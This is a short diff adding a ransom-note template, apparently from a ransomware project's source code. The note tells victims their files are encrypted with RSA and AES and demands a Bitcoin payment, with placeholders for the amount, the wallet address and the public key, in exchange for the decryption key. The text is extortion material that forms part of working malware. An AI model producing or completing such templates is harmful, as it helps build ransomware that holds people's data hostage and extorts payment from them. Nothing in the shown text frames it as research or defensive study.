@@ -1,0 +1,13 @@
+!!! IMPORTANT !!! 
+
+All of your files are encrypted with RSA 4096 and AES 256 ciphers.
+More information about RSA and AES can be found here:
+- https://en.wikipedia.org/wiki/RSA_(cryptosystem)
+- https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
+
+Decrypting of your files is only possible with the private key and decrypt program, which is not available to you.
+To receive your private key please send {{.BitcoinCount}}BTC to {{.BitcoinAddress}} together with the public key used to encrypt your files
+
+The public key to use in the form is
+
+{{.PublicKey}}
